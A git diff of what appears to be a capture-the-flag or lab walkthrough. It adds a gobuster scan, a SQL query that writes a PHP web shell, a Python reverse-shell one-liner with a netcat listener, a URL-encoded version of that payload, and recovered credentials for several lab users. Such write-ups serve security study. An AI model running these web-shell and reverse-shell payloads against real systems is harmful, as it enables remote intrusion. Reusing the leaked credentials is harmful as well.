@@ -14,6 +14,10 @@ PORT    STATE SERVICE
 ```
 
 ## dirb 
+### commad:
+```
+gobuster  dir --url https://{IP} --wordlist /usr/share/wordlists/dirb/common.txt --no-tls-validation
+```
 
 DIRB IS a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
 ![ alt text for screen readers](imgs/dirb_scanHTTP.png "dirb_scanHTTP")
@@ -51,7 +55,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c
 
 
 
-export RHOST="10.12.100.143";export RPORT=3412;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+export RHOST="IP";export RPORT=3412;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
 ## GET a foothold on the machine 
 
@@ -59,7 +63,7 @@ open a port and start listening for incoming connection
 
 nc -lk -p 3412
 
-encode the pyload and pass it to cmd in : https://10.12.100.143/?cmd=(encoded pyload)
+encode the pyload and pass it to cmd in : https://IP/forum/templates_c/pyload.php/?cmd=(encoded pyload)
 
 
 
@@ -74,3 +78,14 @@ thor:x:1004:1004:,,,:/home/thor:/bin/bash
 zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
 
 
+$ cat /home/LOOKATME/password
+cat /home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+$
+
+
+laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+
+https://10.11.100.68/forum/templates_c/pyload.php/?cmd=export%20RHOST%3D%2210.11.100.68%22%3Bexport%20RPORT%3D3412%3Bpython%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27
